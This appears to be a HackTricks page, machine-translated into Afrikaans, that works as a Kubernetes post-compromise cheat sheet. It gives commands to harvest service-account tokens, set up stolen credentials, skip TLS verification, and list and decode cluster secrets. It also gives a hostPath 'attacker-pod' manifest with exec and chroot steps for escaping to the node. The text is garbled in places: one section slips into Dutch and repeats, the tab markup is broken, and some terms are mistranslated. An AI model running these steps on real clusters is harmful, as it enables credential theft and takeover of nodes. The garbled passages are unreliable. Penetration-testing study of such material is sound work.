# Kubernetes Enumerasie

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Kubernetes Tokens

As jy toegang tot 'n rekenaar gekompromitteer het, mag die gebruiker toegang tot 'n Kubernetes-platform h√™. Die token word gewoonlik in 'n l√™er aangedui deur die **omgewingsveranderlike `KUBECONFIG`** of **binne `~/.kube`**.

In hierdie vouer kan jy konfigurasie-l√™ers vind met **tokens en konfigurasies om met die API-bediener te verbind**. In hierdie vouer kan jy ook 'n kasvouer vind met voorheen opgehaalde inligting.

As jy 'n pod binne 'n Kubernetes-omgewing gekompromitteer het, is daar ander plekke waar jy tokens en inligting oor die huidige K8-omgewing kan vind:

### Diensrekeningtokens

Voordat jy voortgaan, as jy nie weet wat 'n diens in Kubernetes is nie, sal ek voorstel dat jy **hierdie skakel volg en ten minste die inligting oor die Kubernetes-argitektuur lees**.

Geneem van die Kubernetes [dokumentasie](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_"Wanneer jy 'n pod skep, as jy nie 'n diensrekening spesifiseer nie, word dit outomaties toegewys aan die_ default _diensrekening in dieselfde naamruimte."_

**ServiceAccount** is 'n voorwerp wat deur Kubernetes bestuur word en gebruik word om 'n identiteit te voorsien vir prosesse wat in 'n pod loop.\
Elke diensrekening het 'n geheim wat daarmee verband hou, en hierdie geheim bevat 'n draer-token. Dit is 'n JSON Web Token (JWT), 'n metode om aansprake veilig tussen twee partye voor te stel.

Gewoonlik bevat **een** van die gids:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

die l√™ers:

* **ca.crt**: Dit is die CA-sertifikaat om Kubernetes-kommunikasie te kontroleer
* **namespace**: Dit dui die huidige naamruimte aan
* **token**: Dit bevat die **diens-token** van die huidige pod.

Nou dat jy die token het, kan jy die API-bediener binne die omgewingsveranderlike **`KUBECONFIG`** vind. Vir meer inligting voer `(env | set) | grep -i "kuber|kube`**`"`** uit.

Die diensrekeningtoken word onderteken deur die sleutel in die l√™er **sa.key** en geverifieer deur **sa.pub**.

Standaardligging op **Kubernetes**:

* /etc/kubernetes/pki

Standaardligging op **Minikube**:

* /var/lib/localkube/certs

### Warm Pods

_**Warm pods is**_ pods wat 'n bevoorregte diensrekeningtoken bevat. 'n Bevoorregte diensrekeningtoken is 'n token wat toestemming het om bevoorregte take uit te voer, soos lys geheime, pods skep, ens.

## RBAC

As jy nie weet wat **RBAC** is nie, **lees hierdie afdeling**.

## Enumerasie Spiekbriefie

Om 'n K8s-omgewing te enumereer, het jy 'n paar dinge nodig:

* 'n **Geldige outentiserings-token**. In die vorige afdeling het ons gesien waar om te soek vir 'n gebruikerstoken en 'n diensrekeningtoken.
* Die **adres (**_**https://host:port**_**) van die Kubernetes API**. Dit kan gewoonlik in die omgewingsveranderlikes en/of in die kube-konfigurasie-l√™er gevind word.
* **Opsioneel**: Die **ca.crt om die API-bediener te verifieer**. Dit kan in dieselfde plekke gevind word waar die token gevind kan word. Dit is nuttig om die API-bediener se sertifikaat te verifieer, maar deur `--insecure-skip-tls-verify` met `kubectl` of `-k` met `curl` te gebruik, sal jy dit nie nodig h√™ nie.

Met daardie besonderhede kan jy **Kubernetes enumereer**. As die **API** om een of ander rede **toeganklik** is deur die **Internet**, kan jy net daardie inligting aflaai en die platform vanaf jou rekenaar enumereer.

Gewoonlik is die **API-bediener egter binne 'n interne netwerk**, dus sal jy 'n **tonnel moet skep** deur die gekompromitteerde rekenaar om dit vanaf jou rekenaar te kan bereik, of jy kan die [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) bin√™re l√™er oplaai, of `curl/wget/anything` gebruik om rou HTTP-versoeke na die API-bediener uit te voer.

### Verskille tussen die `list` en `get` werkwoorde

Met **`get`**-regte kan jy inligting van spesifieke bates (_`describe`-opsie in `kubectl`_) API toegang:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
As jy die **`lys`** toestemming het, is jy toegelaat om API-versoeke uit te voer om 'n tipe bate te lys (_`get` opsie in `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
As jy die **`watch`** toestemming het, is jy toegelaat om API-versoeke uit te voer om bates te monitor:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Hulle maak 'n stroomverbinding oop wat die volledige manifest van 'n Implementering terugstuur telkens as dit verander (of wanneer 'n nuwe een geskep word).

{% hint style="danger" %}
Die volgende `kubectl`-opdragte dui net aan hoe om die voorwerpe te lys. As jy die data wil benader, moet jy in plaas daarvan `beskryf` gebruik.
{% endhint %}

### Gebruik van curl

Van binne 'n peul kan jy verskeie omgewingsveranderlikes gebruik:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Standaard kan die pod toegang kry tot die kube-api bediener in die domeinnaam `kubernetes.default.svc` en jy kan die kube-netwerk sien in `/etc/resolv.config` waar jy die adres van die kubernetes DNS-bedieners sal vind (die ".1" van dieselfde reeks is die kube-api eindpunt).
{% endhint %}

### Gebruik kubectl

Met die token en die adres van die API-bedieners kan jy kubectl of curl gebruik om toegang daartoe te verkry soos hier aangedui:

Standaard kommunikeer die APISERVER met die `https://` skema
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> as daar geen `https://` in die url is nie, kan jy 'n fout soos 'n slegte versoek kry.

Jy kan 'n [**amptelike kubectl spiekbrief hier**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/) vind. Die doel van die volgende afdelings is om op 'n geordende manier verskillende opsies te bied om die nuwe K8s waarop jy toegang het, te ondersoek en te verstaan.

Om die HTTP-versoek wat `kubectl` stuur te vind, kan jy die parameter `-v=8` gebruik.

#### MitM kubectl - Proksi√´ring van kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Huidige Konfigurasie

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

As jy daarin geslaag het om sekere gebruikers se legitimasie te steel, kan jy dit **plaaslik konfigureer** deur iets soos die volgende te gebruik:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Kry Ondersteunde Hulpbronne

Met hierdie inligting sal jy al die dienste wat jy kan lys, ken

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Kry Huidige Voorregte

{% tabs %}
{% tab title="kubectl" %}Om die huidige voorregte van die huidige gebruiker te kry, kan jy die volgende opdrag gebruik:

```bash
kubectl auth can-i --list
```

Hierdie opdrag sal 'n lys van alle aksies gee wat die huidige gebruiker mag uitvoer.
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

'n Ander manier om jou voorregte te kontroleer, is om die instrument te gebruik: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Jy kan meer leer oor **Kubernetes RBAC** in:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Sodra jy weet watter voorregte** jy het, kyk na die volgende bladsy om uit te vind **of jy dit kan misbruik** om voorregte te verhoog:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Kry ander rolle

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Kry namespaces

Kubernetes ondersteun **veelvuldige virtuele klusters** wat ondersteun word deur dieselfde fisiese kluster. Hierdie virtuele klusters word **namespaces** genoem.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### Kry geheime

{% tabs %}
{% tab title="kubectl" %}Voer die volgende bevel uit om geheime in die huidige naamruimte te kry:

```bash
kubectl get secrets
```

Voer die volgende bevel uit om die inhoud van 'n spesifieke geheim te kry:

```bash
kubectl get secret <secret_name> -o yaml
```

Voer die volgende bevel uit om die inhoud van 'n spesifieke geheim te ontsleutel:

```bash
kubectl get secret <secret_name> -o jsonpath="{.data.<data_key>}" | base64 --decode
```
{% endtab %}
{% endtabs %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

As jy geheime kan lees, kan jy die volgende lyne gebruik om die voorregte wat verband hou met elke token te kry:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Kry Diensrekeninge

Soos bespreek aan die begin van hierdie bladsy **word 'n diensrekening gewoonlik aan 'n pod toegewys wanneer dit uitgevoer word**. Daarom kan die lys van diensrekeninge, hul toestemmings en waar hulle uitgevoer word, 'n gebruiker in staat stel om voorregte te verhoog.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Kry Implementasies

Die implementasies spesifiseer die **komponente** wat moet **uitgevoer** word.

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Kry Pods

Die Pods is die werklike **houers** wat sal **loop**.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Kry Dienste

Kubernetes **dienste** word gebruik om 'n diens op 'n spesifieke poort en IP bloot te stel (wat as 'n vragbalanser sal optree vir die peule wat die diens eintlik aanbied). Dit is interessant om te weet waar jy ander dienste kan vind om te probeer aanval.

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Kry knooppunte

Kry al die **knooppunte wat binne die groep geconfigureer is**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Kry DaemonSets

**DaeamonSets** maak dit moontlik om te verseker dat 'n **spesifieke pod in alle nodusse** van die groep (of in die geselekteerde) loop. As jy die DaemonSet verwyder, sal die pods wat deur dit bestuur word, ook verwyder word.

{% tabs %}
{% tab title="kubectl" %}
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Kry cronjob

Cron-werk neem toe om met behulp van crontab-soort sintaksis die lancering van 'n pod te skeduleer wat 'n bepaalde aksie sal uitvoer.

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Kry configMap

configMap bevat altyd baie inligting en konfigurasie l√™ers wat aan programme verskaf word wat in die kubernetes loop. Gewoonlik kan jy baie wagwoorde, geheime, tokens vind wat gebruik word om te verbind en te valideer na ander interne/eksterne dienste. 

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}

{% tab title="kubectl" %}
### Kry "alles"

Om alle bronobjekte in een Kubernetes-cluster te krijgen, kunt u het volgende commando gebruiken:

```bash
kubectl get all --all-namespaces
```

Dit commando geeft alle bronobjecten weer in alle namespaces van het cluster. Het kan handig zijn bij het uitvoeren van een algemene inventarisatie van het cluster.

{% endtab %}

{% tab title="kubectx" %}
### Kry "alles"

Om alle bronobjekte in een Kubernetes-cluster te kry, kan jy die volgende bevel gebruik:

```bash
kubectl get all --all-namespaces
```

Hierdie bevel wys alle bronobjekte in alle namespaces van die cluster. Dit kan nuttig wees wanneer jy 'n algemene inventaris van die cluster doen.

{% endtab %}
{% endtabs %}
```
k get all
```
{% endtab %}
{% endtabs %}

### **Kry Pods verbruik**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Ontsnapping uit die houer

As jy nuwe houers kan skep, kan jy dalk daaruit ontsnap na die node. Om dit te doen, moet jy 'n nuwe houer skep deur 'n yaml-l√™er te gebruik, oorskakel na die geskepte houer en dan chroot in die stelsel van die node. Jy kan bestaande houers as verwysing vir die yaml-l√™er gebruik, aangesien hulle bestaande beelde en paaie vertoon.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> as jy 'n pod op 'n spesifieke node wil skep, kan jy die volgende bevel gebruik om etikette op die node te kry
>
> `k get nodes --show-labels`
>
> Gewoonlik is kubernetes.io/hostname en node-role.kubernetes.io/master albei goeie etikette om te kies.
>
> [verwysing]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Dan skep jy jou attack.yaml l√™er
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[oorpsronklike yaml-bron](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Daarna skep jy die pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Nou kan jy oorskakel na die geskepte pod soos volg:
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
En uiteindelik chroot jy in die stelsel van die node.
```bash
chroot /root /bin/bash
```
Inligting verkry vanaf: [Kubernetes Namespace Uitbreek deur gebruik te maak van 'n Onveilige Host Path Volume - Deel 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Aanval en Verdediging van Kubernetes: Bust-A-Kube - Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Verwysings

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
